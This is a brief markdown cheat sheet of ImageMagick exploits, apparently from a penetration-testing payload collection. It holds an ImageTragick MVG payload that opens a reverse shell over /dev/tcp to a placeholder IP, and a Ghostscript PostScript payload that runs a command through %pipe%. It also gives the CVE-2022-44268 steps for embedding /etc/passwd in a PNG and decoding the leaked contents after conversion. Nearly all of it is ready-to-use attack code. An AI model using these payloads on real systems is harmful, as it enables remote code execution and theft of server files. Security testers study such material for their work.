# ImageMagick Exploits

## ImageTragik Exploit v1

Simple reverse shell

```powershell
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/ip/80 0<&1 2>&1'
pop graphic-context
pop graphic-context
```

## ImageTragik Exploit v2

Simple `id` payload

```powershell
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```

then use `convert shellexec.jpeg whatever.gif`


## CVE-2022-44268

Information Disclosure: embedded the content of an arbitrary remote file

* Generate the payload
    ```ps1
    apt-get install pngcrush imagemagick exiftool exiv2 -y
    pngcrush -text a "profile" "/etc/passwd" exploit.png
    ```
* Trigger the exploit by uploading the file. The backend might use something like `convert pngout.png pngconverted.png`
* Download the converted picture and inspect its content with: `identify -verbose pngconverted.png`
* Convert the exfiltrated data: `python3 -c 'print(bytes.fromhex("HEX_FROM_FILE").decode("utf-8"))'` 


## Thanks to

* [openwall.com/lists/oss-security/2018/08/21/2 by Tavis Ormandy](http://openwall.com/lists/oss-security/2018/08/21/2)